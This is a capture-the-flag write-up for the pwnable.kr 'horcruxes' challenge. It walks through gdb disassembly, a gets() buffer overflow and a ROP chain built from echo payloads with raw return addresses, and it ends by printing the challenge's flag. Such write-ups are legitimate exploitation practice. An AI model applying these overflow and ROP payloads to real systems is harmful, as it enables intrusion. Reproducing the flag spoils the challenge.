- FINALLY! Learning about ROPs!
- Ok, so seemse like there is a binary - and no source code, and no symobls! :O
	+ Well this is going to be a challange
- Let's take a look of the main function
```c
Dump of assembler code for function main:
   0x0809ff24 <+0>:	    lea    ecx,[esp+0x4]
   0x0809ff28 <+4>:	    and    esp,0xfffffff0
   0x0809ff2b <+7>:	    push   DWORD PTR [ecx-0x4]
   0x0809ff2e <+10>:	push   ebp
   0x0809ff2f <+11>:	mov    ebp,esp
   0x0809ff31 <+13>:	push   ecx
=> 0x0809ff32 <+14>:	sub    esp,0x14
   0x0809ff35 <+17>:	mov    eax,ds:0x80a2064
   0x0809ff3a <+22>:	push   0x0
   0x0809ff3c <+24>:	push   0x2
   0x0809ff3e <+26>:	push   0x0
   0x0809ff40 <+28>:	push   eax
   0x0809ff41 <+29>:	call   0x809fcf0 <setvbuf@plt>
   0x0809ff46 <+34>:	add    esp,0x10
   0x0809ff49 <+37>:	mov    eax,ds:0x80a2060
   0x0809ff4e <+42>:	push   0x0
   0x0809ff50 <+44>:	push   0x2
   0x0809ff52 <+46>:	push   0x0
   0x0809ff54 <+48>:	push   eax
   0x0809ff55 <+49>:	call   0x809fcf0 <setvbuf@plt>
   0x0809ff5a <+54>:	add    esp,0x10
   0x0809ff5d <+57>:	sub    esp,0xc
   0x0809ff60 <+60>:	push   0x3c
   0x0809ff62 <+62>:	call   0x809fc90 <alarm@plt>
   0x0809ff67 <+67>:	add    esp,0x10
   0x0809ff6a <+70>:	call   0x80a0324 <hint>
   0x0809ff6f <+75>:	call   0x80a0177 <init_ABCDEFG>
   0x0809ff74 <+80>:	sub    esp,0xc
   0x0809ff77 <+83>:	push   0x0
   0x0809ff79 <+85>:	call   0x809fc20 <seccomp_init@plt>
   0x0809ff7e <+90>:	add    esp,0x10
   0x0809ff81 <+93>:	mov    DWORD PTR [ebp-0xc],eax
   0x0809ff84 <+96>:	push   0x0
   0x0809ff86 <+98>:	push   0xad
   0x0809ff8b <+103>:	push   0x7fff0000
   0x0809ff90 <+108>:	push   DWORD PTR [ebp-0xc]
   0x0809ff93 <+111>:	call   0x809fc60 <seccomp_rule_add@plt>
   0x0809ff98 <+116>:	add    esp,0x10
   0x0809ff9b <+119>:	push   0x0
   0x0809ff9d <+121>:	push   0x5
   0x0809ff9f <+123>:	push   0x7fff0000
   0x0809ffa4 <+128>:	push   DWORD PTR [ebp-0xc]
   0x0809ffa7 <+131>:	call   0x809fc60 <seccomp_rule_add@plt>
   0x0809ffac <+136>:	add    esp,0x10
   0x0809ffaf <+139>:	push   0x0
   0x0809ffb1 <+141>:	push   0x3
   0x0809ffb3 <+143>:	push   0x7fff0000
   0x0809ffb8 <+148>:	push   DWORD PTR [ebp-0xc]
   0x0809ffbb <+151>:	call   0x809fc60 <seccomp_rule_add@plt>
   0x0809ffc0 <+156>:	add    esp,0x10
   0x0809ffc3 <+159>:	push   0x0
   0x0809ffc5 <+161>:	push   0x4
   0x0809ffc7 <+163>:	push   0x7fff0000
   0x0809ffcc <+168>:	push   DWORD PTR [ebp-0xc]
   0x0809ffcf <+171>:	call   0x809fc60 <seccomp_rule_add@plt>
   0x0809ffd4 <+176>:	add    esp,0x10
   0x0809ffd7 <+179>:	push   0x0
   0x0809ffd9 <+181>:	push   0xfc
   0x0809ffde <+186>:	push   0x7fff0000
   0x0809ffe3 <+191>:	push   DWORD PTR [ebp-0xc]
   0x0809ffe6 <+194>:	call   0x809fc60 <seccomp_rule_add@plt>
   0x0809ffeb <+199>:	add    esp,0x10
   0x0809ffee <+202>:	sub    esp,0xc
   0x0809fff1 <+205>:	push   DWORD PTR [ebp-0xc]
   0x0809fff4 <+208>:	call   0x809fc80 <seccomp_load@plt>
   0x0809fff9 <+213>:	add    esp,0x10
   0x0809fffc <+216>:	call   0x80a0009 <ropme>
   0x080a0001 <+221>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x080a0004 <+224>:	leave  
   0x080a0005 <+225>:	lea    esp,[ecx-0x4]
   0x080a0008 <+228>:	ret    
End of assembler dump.
```
- I won't dig into every line - but what I can already see is a few intersting things
	+ setvbuf is called, pretty standard stuff, probably to make stdin/stdout unbuffered
	+ alarm is called (with 0x3c as a paramter), this probably means the code will crash after 60 seconds
		* Tested it - it's true :)
	+ seccomp is used - there are 5 rules that are set - for now I won't check what are the rules
		* I guess that open/read/write/exit are allowed, but I will probably have to look into it later
	+ The most important thing in here - there is a function called ropme! let's see what ropme is doing

- Let's break it down, I will comment every section and what it's probably doing
```c
Dump of assembler code for function ropme:
   0x080a0009 <+0>:	    push   ebp
   0x080a000a <+1>:	    mov    ebp,esp
   0x080a000c <+3>:	    sub    esp,0x78
=> 0x080a000f <+6>:	    sub    esp,0xc
   0x080a0012 <+9>:	    push   0x80a050c
   0x080a0017 <+14>:	call   0x809fc40 <printf@plt>
   ; print the first string I see probably
   ; "Voldemort concealed his splitted soul inside 7 horcruxes."
   ; "Find all horcruxes, and destroy it!"

   0x080a001c <+19>:	add    esp,0x10
   0x080a001f <+22>:	sub    esp,0x8
   0x080a0022 <+25>:	lea    eax,[ebp-0x10]
   0x080a0025 <+28>:	push   eax
   0x080a0026 <+29>:	push   0x80a0519
   0x080a002b <+34>:	call   0x809fd10 <__isoc99_scanf@plt>
   ; "Select Menu:"
   ; Read the input for menu probably - probably an int

   0x080a0030 <+39>:	add    esp,0x10
   0x080a0033 <+42>:	call   0x809fc70 <getchar@plt>
   ; "How many EXP did you earned? : "(?)
   ; Getting the amount of EXP(?)

   0x080a0038 <+47>:	mov    edx,DWORD PTR [ebp-0x10]
   0x080a003b <+50>:	mov    eax,ds:0x80a2088
   0x080a0040 <+55>:	cmp    edx,eax
   0x080a0042 <+57>:	jne    0x80a004e <ropme+69>
   0x080a0044 <+59>:	call   0x809fe4b <A>
   0x080a0049 <+64>:	jmp    0x80a0170 <ropme+359>
   ; Some kind of an if statment - I need to pass it!
   ; 0x80a0170 - is causing the function to jump to the end

   0x080a004e <+69>:	mov    edx,DWORD PTR [ebp-0x10]
   0x080a0051 <+72>:	mov    eax,ds:0x80a2070
   0x080a0056 <+77>:	cmp    edx,eax
   0x080a0058 <+79>:	jne    0x80a0064 <ropme+91>
   0x080a005a <+81>:	call   0x809fe6a <B>
   0x080a005f <+86>:	jmp    0x80a0170 <ropme+359>
   ; Another if that I need to make sure that I pass

   0x080a0064 <+91>:	mov    edx,DWORD PTR [ebp-0x10]
   0x080a0067 <+94>:	mov    eax,ds:0x80a2084
   0x080a006c <+99>:	cmp    edx,eax
   0x080a006e <+101>:	jne    0x80a007a <ropme+113>
   0x080a0070 <+103>:	call   0x809fe89 <C>
   0x080a0075 <+108>:	jmp    0x80a0170 <ropme+359>
   ; Another if that I need to make sure that I pass

   0x080a007a <+113>:	mov    edx,DWORD PTR [ebp-0x10]
   0x080a007d <+116>:	mov    eax,ds:0x80a206c
   0x080a0082 <+121>:	cmp    edx,eax
   0x080a0084 <+123>:	jne    0x80a0090 <ropme+135>
   0x080a0086 <+125>:	call   0x809fea8 <D>
   0x080a008b <+130>:	jmp    0x80a0170 <ropme+359>
   ; Another if that I need to make sure that I pass

   0x080a0090 <+135>:	mov    edx,DWORD PTR [ebp-0x10]
   0x080a0093 <+138>:	mov    eax,ds:0x80a2080
   0x080a0098 <+143>:	cmp    edx,eax
   0x080a009a <+145>:	jne    0x80a00a6 <ropme+157>
   0x080a009c <+147>:	call   0x809fec7 <E>
   0x080a00a1 <+152>:	jmp    0x80a0170 <ropme+359>
   ; Another if that I need to make sure that I pass

   0x080a00a6 <+157>:	mov    edx,DWORD PTR [ebp-0x10]
   0x080a00a9 <+160>:	mov    eax,ds:0x80a2074
   0x080a00ae <+165>:	cmp    edx,eax
   0x080a00b0 <+167>:	jne    0x80a00bc <ropme+179>
   0x080a00b2 <+169>:	call   0x809fee6 <F>
   0x080a00b7 <+174>:	jmp    0x80a0170 <ropme+359>
   ; Another if that I need to make sure that I pass

   0x080a00bc <+179>:	mov    edx,DWORD PTR [ebp-0x10]
   0x080a00bf <+182>:	mov    eax,ds:0x80a207c
   0x080a00c4 <+187>:	cmp    edx,eax
   0x080a00c6 <+189>:	jne    0x80a00d2 <ropme+201>
   0x080a00c8 <+191>:	call   0x809ff05 <G>
   0x080a00cd <+196>:	jmp    0x80a0170 <ropme+359>
   ; Another if that I need to make sure that I pass
   ; Indeed there are 7 of those :)

   0x080a00d2 <+201>:	sub    esp,0xc
   0x080a00d5 <+204>:	push   0x80a051c
   0x080a00da <+209>:	call   0x809fc40 <printf@plt>
   0x080a00df <+214>:	add    esp,0x10
   0x080a00e2 <+217>:	sub    esp,0xc
   0x080a00e5 <+220>:	lea    eax,[ebp-0x74]
   0x080a00e8 <+223>:	push   eax
   0x080a00e9 <+224>:	call   0x809fc50 <gets@plt>
   0x080a00ee <+229>:	add    esp,0x10
   0x080a00f1 <+232>:	sub    esp,0xc
   0x080a00f4 <+235>:	lea    eax,[ebp-0x74]
   0x080a00f7 <+238>:	push   eax
   0x080a00f8 <+239>:	call   0x809fd20 <atoi@plt>
   0x080a00fd <+244>:	add    esp,0x10
   0x080a0100 <+247>:	mov    edx,eax
   0x080a0102 <+249>:	mov    eax,ds:0x80a2078
   0x080a0107 <+254>:	cmp    edx,eax
   0x080a0109 <+256>:	jne    0x80a0160 <ropme+343>
   0x080a010b <+258>:	sub    esp,0x8
   0x080a010e <+261>:	push   0x0
   0x080a0110 <+263>:	push   0x80a053c
   0x080a0115 <+268>:	call   0x809fcc0 <open@plt>
   0x080a011a <+273>:	add    esp,0x10
   0x080a011d <+276>:	mov    DWORD PTR [ebp-0xc],eax
   0x080a0120 <+279>:	sub    esp,0x4
   0x080a0123 <+282>:	push   0x64
   0x080a0125 <+284>:	lea    eax,[ebp-0x74]
   0x080a0128 <+287>:	push   eax
   0x080a0129 <+288>:	push   DWORD PTR [ebp-0xc]
   0x080a012c <+291>:	call   0x809fc30 <read@plt>
   0x080a0131 <+296>:	add    esp,0x10
   0x080a0134 <+299>:	mov    BYTE PTR [ebp+eax*1-0x74],0x0
   0x080a0139 <+304>:	sub    esp,0xc
   0x080a013c <+307>:	lea    eax,[ebp-0x74]
   0x080a013f <+310>:	push   eax
   0x080a0140 <+311>:	call   0x809fca0 <puts@plt>
   0x080a0145 <+316>:	add    esp,0x10
   0x080a0148 <+319>:	sub    esp,0xc
   0x080a014b <+322>:	push   DWORD PTR [ebp-0xc]
   0x080a014e <+325>:	call   0x809fd30 <close@plt>
   0x080a0153 <+330>:	add    esp,0x10
   0x080a0156 <+333>:	sub    esp,0xc
   0x080a0159 <+336>:	push   0x0
   0x080a015b <+338>:	call   0x809fcb0 <exit@plt>
   0x080a0160 <+343>:	sub    esp,0xc
   0x080a0163 <+346>:	push   0x80a0544
   0x080a0168 <+351>:	call   0x809fca0 <puts@plt>
   0x080a016d <+356>:	add    esp,0x10
   0x080a0170 <+359>:	mov    eax,0x0
   0x080a0175 <+364>:	leave  
   0x080a0176 <+365>:	ret   
```

- Running `file horcruxes` I found that it's a 32bit binary
	+ It's important for later shellcode creation
- I took a break learning about what ROP (Return Orinted Programing) is, a bit of reading and a bit of LiveOverFlow and I'm good
- I want to take a look at this code and see what the if statment are checking - after that maybe finding a BOF to create a ROP chain

- Let's start understading this code
	+ First of all I wanted to understand where my first input is saved
	+ I used `x/30d $esp` to see the stack and searched for my value
	+ I found out it is stored here `p/d *0xffffdbb8`
	+ Seems like there is nothing intersting here because it's an int in the end

- The annoying thing is that the first if is comparing edx to eax
	+ edx is the number I input, eax - seems is equalt to the value in `ds:0x80a2088` - which is changing every time!
	+ 

- The second input I give is using gets - very vulnrable.
- Looking at the ret of the function ropme, the stack looks like this:
```c
(gdb) x/20x $esp
0xffffdbcc:	0x080a0001	0x00000001	0xffffdc94	0xffffdc9c
0xffffdbdc:	0x080a3008	0xf7f9f3dc	0xffffdc00	0x00000000
0xffffdbec:	0xf7e04647	0xf7f9f000	0xf7f9f000	0x00000000
0xffffdbfc:	0xf7e04647	0x00000001	0xffffdc94	0xffffdc9c
0xffffdc0c:	0x00000000	0x00000000	0x00000000	0xf7f9f000
```
- `0x080a0001` is the address back to main - I need to overwrite that
- Cool. I BOFed my way to a seg fault :)
`1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111112222`
- The payload above is making the ret in the end of ropme "2222" (0x32323232)
	+ Now, I need to understand where I want to jump
- As a start, let's try to jump into funtion A 
	+ There are functions A, B, C, D, E, F and G
	+ All the ifs in ropme are false, so I am not entering any of them - let's see what happends if I do
- A's address is `0x809fe4b` - let's jump there
- `echo -ne "69\n111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\x4b\xfe\x09\x08" > shellcode.bin`
- The payload above is giving 69 as the first input (menu) and then using BOF to overwrite the return address in the end of ropme to the A function.
- It worked! I get the following message:
- `You found "Tom Riddle's Diary" (EXP +545228611)`
	+ Seems like the EXP is changing each run
		* The reason for this seems to be the fact that this number is generated using `ds:0x80a2088` which is undefined proabably, so a diffrent value is there everytime we run our code
- The idea here is jumping from function to funtion - let's do it!
- The ESP when A is making the ret is at `0xffffdbe0`, I need to make sure the value there is function B.
- `echo -ne "69\n111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\x4b\xfe\x09\x08\x6a\xfe\x09\x08" > shellcode.bin`
- BOOM! Jumped into B ;)

- Let's build a ROP chain for all of the function
- I take all of the address of B, C, D, E, F, G
`B: \x08\x09\xfe\x6a 
 C: \x08\x09\xfe\x89
 D: \x08\x09\xfe\xa8
 E: \x08\x09\xfe\xc7
 F: \x08\x09\xfe\xe6
 G: \x08\x09\xff\x05`
- Concat them together and let's cyber ;)

- `echo -ne "69\n111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\x4b\xfe\x09\x08\x6a\xfe\x09\x08\x89\xfe\x09\x08\xa8\xfe\x09\x08\xc7\xfe\x09\x08\xe6\xfe\x09\x08\x05\xff\x09\x08\x01\x01\x0a\x08" > shellcode.bin`

- COOL! but I still get segfault, let's add the real return address for main `0x080a0001`

- `echo -ne "69\n111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\x4b\xfe\x09\x08\x6a\xfe\x09\x08\x89\xfe\x09\x08\xa8\xfe\x09\x08\xc7\xfe\x09\x08\xe6\xfe\x09\x08\x05\xff\x09\x08\x01\x01\x0a\x08" > shellcode.bin`
- It does not work! Why you ask? 0x0a is \n - this is why :(
	+ I need to do something about it hmm
- Wait, I don't need to jump back to main anyway, the code that prints the flag is inside ropme. I can't jump to this code directly because the address has 00 in it
	+ BUT! the address in main that calls ropme is jumpable
	+ `0x0809fff9` - if il'l jump back there when knowing the EXP, I can win! 
- `echo -ne "69\n111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\x4b\xfe\x09\x08\x6a\xfe\x09\x08\x89\xfe\x09\x08\xa8\xfe\x09\x08\xc7\xfe\x09\x08\xe6\xfe\x09\x08\x05\xff\x09\x08\xf9\xff\x09\x08" > shellcode.bin`

- There is a problem now. I'll explain.
	+ The line that I need to pass is this cmp:
	+ `=> 0x080a0107 <+254>:	cmp    eax,edx`
	+ eax holds the sum of all EXP's the ROP functions print
		* If I add up all the numbers - I get the answer
		* I tested it this way: `504301430 + -2043471583 + 1468533847 + 115756185 + 464421393 + -1457937489 + 1447029056` which equal to eax in this check
		* This is true also for the second time I enter ropme, after jumping inside A,B,C,D,E,F,G.
	+ I can calculate the answer - my problem is inputing it.
	+ I only know the answer AFTER I input the shellcode.bin file to the program.
- I need to think of a way to input the answer, or ROPing my way to victory

- I tried doing a few things, but I have managed to do something that will allow me to do so!
- Using the following command `cat shellcode.bin - | ~/horcruxes`
   + You can press *ENTER* and the shellcode will get inside, then you can input from stdin
   + I must say that it's not seem to work - still got the *You'd better get more experience to kill Voldemort* string, which means that the code wasn't getting to the exit() (I am running it without the right permmisions anyway, so the flag shouldn't be printed, but I was hoping to get an error or to the exit())

- I was thinking about maybe finding gadgets with `ROPgadget` in order to maybe find a way to pass this check and get to the flag, but right now I am leaving this challange because it seems like the challange is down. `nc pwnable.kr 9032` is not working, I am getting an RST from the server :(
- I'll be back!

- I'm back! (it works now)
- Found out a about a function callled init_ABCDEFG - which is the one that sets all of the random numbers that ABCDEFG print

- Made it!
- I came up with a cool trick
```bash
mkfifo pipefile
cat shellcode.bin - > pipefile  # This will cat the content of the shellcode to stdin - into the pipefile

# In a different shell
cat pipefile | nc 127.0.0.1 9032

# The first input will be the shellcode, then I can calculate the answer and input it with stdin!
```

- # Magic_spell_1s_4vad4_K3daVr4!
- # pwned.